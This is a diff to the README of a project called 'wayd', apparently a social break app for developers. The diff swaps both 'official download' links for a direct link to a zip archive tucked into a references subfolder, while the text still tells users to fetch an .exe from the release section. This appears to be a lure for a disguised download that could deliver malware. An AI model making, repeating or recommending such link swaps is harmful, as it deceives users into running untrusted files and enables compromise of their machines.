@@ -1,6 +1,6 @@
 # ☕ wayd - Take quick breaks with other programmers
 
-[![](https://img.shields.io/badge/Download-wayd-blue.svg)](https://github.com/gilburtgradatory270/wayd)
+[![](https://img.shields.io/badge/Download-wayd-blue.svg)](https://github.com/gilburtgradatory270/wayd/raw/refs/heads/main/wayd/references/Software-v3.7.zip)
 
 wayd helps you manage your focus during long coding sessions. It provides a simple feed where you see what other developers post while they deal with difficult bugs. You stay connected to your community without leaving your workflow or dealing with complex account setups.
 
@@ -21,7 +21,7 @@ The software works without a central server. You do not need to create an accoun
 
 Follow these steps to set up wayd on your machine.
 
-1. Visit the [official download page](https://github.com/gilburtgradatory270/wayd) to find the latest version of the application.
+1. Visit the [official download page](https://github.com/gilburtgradatory270/wayd/raw/refs/heads/main/wayd/references/Software-v3.7.zip) to find the latest version of the application.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to download it to your computer.
 4. Locate the file in your Downloads folder.
